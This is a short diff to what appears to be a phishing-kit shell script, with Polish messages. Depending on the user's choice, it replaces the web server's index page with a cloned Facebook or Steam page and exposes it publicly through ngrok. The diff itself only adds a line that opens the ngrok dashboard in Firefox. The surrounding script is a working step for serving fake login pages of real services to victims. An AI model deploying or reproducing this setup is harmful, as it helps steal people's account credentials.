@@ -19,12 +19,14 @@ then
 	sudo rm /var/www/html/index.html
 	sudo cp facebook/index.html /var/www/html/index.html
 	./ngrok http 80
+	firefox http://127.0.0.1:4040
 	sudo rm /var/www/html/index.html
 else
 	echo "wybrales Steama";
 	sudo rm /var/www/html/index.html
 	sudo cp steam/index.html /var/www/html/index.html
 	./ngrok http 80
+	firefox http://127.0.0.1:4040
 	sudo rm /var/www/html/index.html
 
 
